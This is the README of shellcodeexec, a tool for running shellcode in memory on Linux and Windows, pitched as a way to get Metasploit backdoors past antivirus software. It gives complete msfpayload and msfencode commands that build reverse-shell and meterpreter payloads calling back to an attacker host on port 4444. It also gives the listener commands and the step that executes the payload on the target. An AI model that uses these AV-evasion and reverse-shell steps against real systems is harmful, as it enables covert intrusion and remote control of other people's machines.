= Short description =

shellcodeexec is a small script to execute in memory a sequence of opcodes.


= Background =

Most of the shellcode launchers out there, including proof of concepts 
part of many "security" books, detail how to allocate a memory page as
readable/writable/executable on POSIX systems, copy over your shellcode
and execute it. This works just fine. However, it is limited to POSIX,
does not necessarily consider 64-bit architecture and Windows systems.


= Description =

This script and the relevant project files (Makefile and Visual Studio
files) allow you to compile the tool once then run your shellcode across
different architectures and operating systems.

Moreover, it solves a common real world issue: the target system's anti
virus software blocking a Metasploit-generated payload stager (either EXE
of ELF). Take for instance the following command line:

    $ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=process LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/shikata_ga_nai -o /tmp/payload.exe -t exe

This generates a Metasploit payload stager, payload.exe, that as soon as
it lands on the AV-protected target system is recognized as malicious and
potentially blocked (depending on the on-access scan settings) by many
anti virus products. At the time of writing this text, 21 out 41 anti
viruses detect it as malicious - http://goo.gl/HTw7o. By encoding it
multiple times with msfencode, less AV softwares detect it, still a lot.

I have been surfing the Net and found some interesting tutorials and
guides about packing, compressing, obfuscating and applying IDA-foo to
portable executables et similar in order to narrow down the number of AV
products that can detect it as a malicious file. This is all interesting,
but does not stop few hard-to-die anti viruses to detect your backdoor.

So the question is, how cool would it be to have a final solution to avoid
all this hassle? This is exactly where this tool comes into play!


= Features =

shellcodeexec:

* Can be compiled and works on POSIX (Linux/Unices) and Windows systems.

* Can be compiled and works on 32-bit and 64-bit architectures.

* As far as I know, no AV detect it as malicious.

* Works in DEP/NX-enabled environments: it allocates the memory page where
  it stores the shellcode as +rwx - Readable Writable and eXecutable.

* It supports alphanumeric encoded payloads: you can pipe your binary-encoded
  shellcode (generated for instance with Metasploit's msfpayload) to
  Metasploit's msfencode to encode it with the alpha_mixed encoder. Set the
  BufferRegister variable to EAX registry where the address in memory of
  the shellcode will be stored, to avoid get_pc() binary stub to be
  prepended to the shellcode.

* Spawns a new thread where the shellcode is executed in a structure
  exception handler (SEH) so that if you wrap shellcodeexec into your own
  executable, it avoids the whole process to crash in case of unexpected
  behaviours.


= HowTo =

1. Generate a Metasploit shellcode and encode it with the alphanumeric
   encoder. For example for a Linux target:

    $ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX

   Or for a Windows target:

    $ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX


2. Execute the Metasploit multi/handler listener on your machine. For
   example for a Linux target:

    $ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E

   Or for a Windows target:

    $ msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E


3. Execute the alphanumeric-encoded shellcode with this tool. For example
   on the Linux target:

    $ ./shellcodeexec <msfencode's alphanumeric-encoded payload>

   Or, on the Windows target:

    C:\WINDOWS\Temp>shellcodeexec.exe <msfencode's alphanumeric-encoded payload>
